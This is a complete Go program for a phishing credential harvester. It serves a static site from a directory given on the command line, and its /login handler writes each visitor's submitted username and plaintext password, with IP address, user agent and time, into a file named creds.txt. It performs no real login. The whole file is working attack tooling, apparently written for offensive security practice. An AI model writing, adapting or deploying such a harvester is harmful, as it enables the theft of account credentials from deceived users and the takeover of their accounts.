package main

import (
	"net/http"
	"os"
	"time"

	log "github.com/Sirupsen/logrus"
	"github.com/gorilla/mux"
)

func login(w http.ResponseWriter, r *http.Request) {
	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue("username"),
		"password":   r.FormValue("password"),
		"user-agent": r.UserAgent(),
		"ipaddress":  r.RemoteAddr,
	}).Info("login attempt")
}

func main() {
	fh, err := os.OpenFile("creds.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer fh.Close()

	log.SetOutput(fh)

	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir(os.Args[1])))
	log.Fatal(http.ListenAndServe("127.0.0.1:8080", r))
}
